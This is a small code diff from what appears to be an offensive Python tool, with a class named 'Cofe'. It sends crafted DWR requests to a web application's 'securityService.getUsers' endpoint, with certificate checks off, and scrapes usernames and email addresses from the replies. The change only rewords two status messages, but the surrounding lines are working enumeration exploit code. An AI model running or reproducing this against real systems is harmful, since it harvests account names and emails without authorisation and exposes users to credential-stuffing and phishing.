@@ -119,7 +119,7 @@ class Cofe:
         r = requests.post(self.url + "dwr/call/plaincall/securityService.getUsers.dwr", data=exploit, verify=False)
         #print(r.text)
         if "200" in str(r) and not "404" in r.text:
-            print(vulnerable("[+] Getting Possible login users... \n"))
+            print(vulnerable("[+] Getting Possible logins... \n"))
             for m in re.findall(r'name="(\w*)"', r.text):
                 print("[+] Possible user: {}".format(str(m)))
         print(notice("[+] Finish all possible logins were got.. \n"))
@@ -131,7 +131,7 @@ class Cofe:
         "c0-scriptName":"securityService","c0-methodName":"getUsers", "c0-id":0, "c0-param0":"number:0", "c0-param1":"boolean:false", "batchId":2}
         r = requests.post(self.url + "dwr/call/plaincall/securityService.getUsers.dwr", data=exploit, verify=False)
         if "200" in str(r) and not "404" in r.text:
-            print(vulnerable("\n[+] Getting Emails login users... \n"))
+            print(vulnerable("\n[+] Getting Emails... \n"))
             for m in re.findall(r'email="([\w\.-]+@[\w\.-]+)"', r.text):
                 print("[+] Possible email: {}".format(str(m)))
         print(notice("[+] Finish all possible mails were got.. \n"))
